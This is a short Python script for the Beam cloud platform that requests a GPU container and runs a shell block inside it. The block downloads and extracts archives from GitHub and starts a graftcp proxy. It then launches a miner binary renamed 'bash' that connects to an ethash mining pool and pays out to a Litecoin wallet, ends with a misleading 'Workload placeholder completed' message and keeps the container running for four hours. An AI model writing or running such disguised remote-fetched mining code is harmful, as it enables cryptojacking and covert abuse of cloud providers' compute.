from beam import function, Image
import subprocess
import time

image = Image(
    base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
)


@function(
    name="t4x3-runner",
    image=image,
    gpu="RTX4090",
    cpu=4,
    memory="8Gi",
    timeout=4 * 60 * 60,
)
def run_script():
    # cek GPU
    subprocess.run(["nvidia-smi"], check=False)

    cmd = """
    set -e

    echo "=== DOWNLOAD FILE ==="
    curl -sL -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip

    echo "=== EXTRACT ==="
    unzip -o pan.zip
        
    cd pan

    echo "=== SET PERMISSION ==="
    chmod -R +x .

    echo "=== START GRAFTCP LOCAL ==="
    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    # tunggu service siap
    sleep 3

    # download lol
    git clone https://github.com/hujisanda/lol198.git
    cd lol198 && chmod u+x bash

    #pindah file    
    mv bash ~/pan
    
    # pindah file pan
    cd ~
    cd pan

    echo "=== RUN PROC VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.kacung --ethstratum ETHPROX
    
    echo "Workload placeholder completed."
    """

    result = subprocess.run(
        ["bash", "-lc", cmd],
        check=False,
    )

    print("Process exited with:", result.returncode)

    print("Keeping the container alive for 4 hours...")
    time.sleep(4 * 60 * 60)
